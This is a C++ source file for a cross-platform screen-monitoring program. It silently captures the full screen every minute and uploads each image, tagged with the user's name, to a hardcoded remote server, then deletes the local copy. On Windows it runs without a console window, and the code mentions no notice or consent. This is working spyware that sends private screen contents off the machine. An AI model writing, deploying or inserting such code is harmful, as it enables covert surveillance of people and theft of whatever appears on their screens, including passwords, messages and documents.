#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <iomanip>
#include <sstream>
#include <vector>
#include <curl/curl.h>

#ifdef _WIN32
    #include <windows.h>
    #include <lmcons.h>
    #include <gdiplus.h>

    using namespace Gdiplus;
#else
    #include <unistd.h>
    #include <pwd.h>
    #include <sys/types.h>
#endif

using namespace std;


string get_username() {
#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) return string(username);
    return "unknown_win";
#else
    struct passwd *pw = getpwuid(getuid());
    // pw_gecos ??
    return pw ? pw->pw_name : "unknown_linux"; 
#endif
}

string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto in_time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&in_time_t), "%Y%m%d_%H%M%S");
    return ss.str();
}

#ifdef _WIN32
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;
    UINT  size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

bool take_windows_screenshot(const string& filename_utf8) {
    int len = MultiByteToWideChar(CP_UTF8, 0, filename_utf8.c_str(), -1, NULL, 0);
    if (len == 0) return false;
    vector<wchar_t> wfilename(len);
    MultiByteToWideChar(CP_UTF8, 0, filename_utf8.c_str(), -1, &wfilename[0], len);

    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int top = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
    
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, left, top, SRCCOPY);

    Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    if (GetEncoderClsid(L"image/png", &clsid) > -1) {
        bitmap.Save(&wfilename[0], &clsid, NULL);
    }

    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return true; 
}
#endif


#ifndef _WIN32
std::string get_linux_screenshot_command(const std::string& filename) {
    if (std::system("which import > /dev/null 2>&1") == 0) {
        return "import -window root \"" + filename + "\"";
    }
    else if (std::system("which gnome-screenshot > /dev/null 2>&1") == 0) {
        return "gnome-screenshot -f \"" + filename + "\"";
    }
    else if (std::system("which scrot > /dev/null 2>&1") == 0) {
        return "scrot \"" + filename + "\"";
    }
    else if (std::system("which maim > /dev/null 2>&1") == 0) {
        return "maim \"" + filename + "\"";
    }
    else {
        return "xwd -root -out \"" + filename + ".xwd\" && "
               "convert \"" + filename + ".xwd\" \"" + filename + "\" && "
               "rm \"" + filename + ".xwd\"";
    }
}
#endif

void send_file(string filename, string user) {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_mime *form = curl_mime_init(curl);
        curl_mimepart *field = curl_mime_addpart(form);
        
        curl_mime_name(field, "file");
        curl_mime_filedata(field, filename.c_str());

        field = curl_mime_addpart(form);
        curl_mime_name(field, "user");
        curl_mime_data(field, user.c_str(), CURL_ZERO_TERMINATED);

        // TODO: Вынести IP в конфиг
        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.31.173:5000/upload");
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            cerr << "Curl Error: " << curl_easy_strerror(res) << endl;
        }
            
        curl_easy_cleanup(curl);
        curl_mime_free(form);
    }
}

void run_monitor() {
    curl_global_init(CURL_GLOBAL_ALL);
    string user = get_username();
    
    #ifdef _WIN32
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    #endif

    while (true) {
        string filename;
        bool screenshot_taken = false;

        #ifdef _WIN32
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        filename = string(tempPath) + "scr_" + get_timestamp() + ".png";
        
        screenshot_taken = take_windows_screenshot(filename);
        #else
        filename = "/tmp/scr_" + get_timestamp() + ".png";
        string cmd = get_linux_screenshot_command(filename);
        if (!cmd.empty() && system(cmd.c_str()) == 0) {
            screenshot_taken = true;
        }
        #endif

        if (screenshot_taken) {
            FILE *f = fopen(filename.c_str(), "rb");
            if (f) {
                fclose(f);
                send_file(filename, user);
                remove(filename.c_str());
                cout << "Screenshot sent for user: " << user << endl;
            } else {
                cerr << "Error: Screenshot file created but not readable." << endl;
            }
        } else {
            cerr << "Failed to take screenshot." << endl;
        }
        
        this_thread::sleep_for(chrono::seconds(60));
    }

    #ifdef _WIN32
    GdiplusShutdown(gdiplusToken);
    #endif

    curl_global_cleanup();
}

#ifdef _WIN32
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    run_monitor();
    return 0;
}
#else
int main() {
    run_monitor();
    return 0;
}
#endif